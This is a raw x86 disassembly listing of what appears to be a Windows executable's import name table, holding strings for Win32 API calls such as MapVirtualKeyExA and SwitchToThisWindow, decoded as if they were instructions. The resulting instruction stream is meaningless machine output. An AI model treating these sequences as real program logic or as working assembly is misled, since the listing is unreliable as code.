  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
